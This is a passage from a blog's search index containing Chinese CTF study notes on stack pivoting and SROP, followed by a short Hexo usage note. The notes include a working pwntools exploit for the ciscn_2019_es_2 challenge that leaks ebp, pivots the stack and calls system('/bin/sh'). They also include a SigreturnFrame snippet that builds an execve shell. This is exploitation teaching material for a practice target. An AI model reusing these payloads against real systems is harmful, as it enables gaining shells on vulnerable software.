title="使用条件："></a>使用条件：</h3><p>溢出长度不够，<code>payload</code>长度收到限制无法执行getshell</p><ul><li>能够栈溢出，起码也要覆盖ebp</li><li>要有可写的地方<ul><li>bss段</li><li>栈中</li></ul></li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>核心</p><p>两次的<code>leave,ret</code><br><code>leave：mov esp,ebp;pop ebp</code></p><p><code>ret：pop eip</code></p></li><li><p>main函数里的栈迁移</p><p>第一次leave ret;将<strong>ebp给放入我们指定的位置</strong>（这个位置的就是迁移后的所在位置）</p><p>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是<strong>system函数的plt地址</strong>）</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/%E7%AC%AC%E4%B8%80%E6%AC%A1.png" alt="第一次"></p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/%E7%AC%AC%E4%BA%8C%E6%AC%A1.png" alt="第二次"></p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>buu的ciscn_2019_es_2</p><p> <a href="https://buuoj.cn/challenges#ciscn_2019_es_2">BUUCTF在线评测</a> </p><ul><li><p>checksec</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737718391990.png" alt="1737718391990"></p></li><li><p>IDA</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737718423112.png" alt="1737718423112"><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737718435019.png" alt="1737718435019"></p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737718474976.png" alt="1737718474976"></p></li><li><p>思路</p><p>就是利用栈迁移，将ebp覆盖成s顶部地址，将返回地址覆盖成leave,ret的地址即可</p><p>现在主要是要得到s顶部的地址，ida里可以<strong>利用第一个read将<code>\0</code>覆盖掉</strong>从而泄露ebp上的内容，计算偏移后得到s地址</p></li><li><p>计算偏移</p><p>将断点下载nop处，gdb调试</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737719058637.png" alt="1737719058637"></p><p>得到偏移0x38</p></li><li><p>构造栈上数据</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/1737719250596.png" alt="1737719250596"></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,25608)</span><br>r=process(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>leave_ret_addr=<span class="hljs-number">0x08048562</span><br>system_addr=<span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(r)</span><br><br>r.recvuntil(<span class="hljs-string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x25</span>+<span class="hljs-string">b&#x27;ANV&#x27;</span><br>r.send(payload1)  <span class="hljs-comment"># 注意这里要是send而不是sendline，否则在底下接收数据的时候会出错，因为多了一个回车那么就不再是recv到ANV了</span><br>r.recvuntil(<span class="hljs-string">&quot;ANV&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br>s_addr=ebp-<span class="hljs-number">0x38</span><br>binsh_addr=s_addr+<span class="hljs-number">0x10</span> <span class="hljs-comment"># 栈上距离s填充四格，所以要加16，也就是0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s_addr))<br><br>payload2=<span class="hljs-string">b&#x27;AAAA&#x27;</span>+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s_addr)+p32(leave_ret_addr)<br>r.send(payload2)<br><span class="hljs-comment"># pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><ul><li><p>signal机制</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/signal.png" alt="signal"></p><ul><li>内核向进程发送signal机制，进程被挂起，进入内核态</li><li>内核态保存上下文：将所有寄存器压入栈中，压入signal信息。指向sigreturn的系统掉哦那个地址，也就是图中所示的1过程</li><li>在signal handler后执行sigreturn，恢复寄存器，我们所做的就是<strong>构造好栈，然后触发sigreturn，达到控制寄存器的目的，从而getshell</strong></li><li>32位sigreturn调用号为118</li><li>64位sigreturn调用号为15</li></ul></li><li><p>前提条件</p><ul><li>必须存在栈溢出</li><li>必须知道&#x2F;bin&#x2F;sh的地址</li><li>允许溢出的长度必须足够长</li><li>可以去系统调用sigreturn</li><li>知道syscall的地址</li></ul></li><li><p>如何利用</p><ul><li><p>我们通过伪造SignFrame，然后除法Sigreturn，将栈中构造好的数据送入寄存器，通过syscall执行系统调用</p></li><li><p>pwntools集成了SROP的攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例子</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure><p>我们可以直接设置寄存器的值</p></li><li><p>首先设置rax，将返回地址覆盖成syscall，触发sigreturn即可</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>备注</title>
    <link href="/2025/01/18/%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/01/18/%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> 文件名<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>步骤</p><ol><li>将图片放入对于文件夹下</li><li>md中输入<code>![图片下的备注](图片名)</code></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
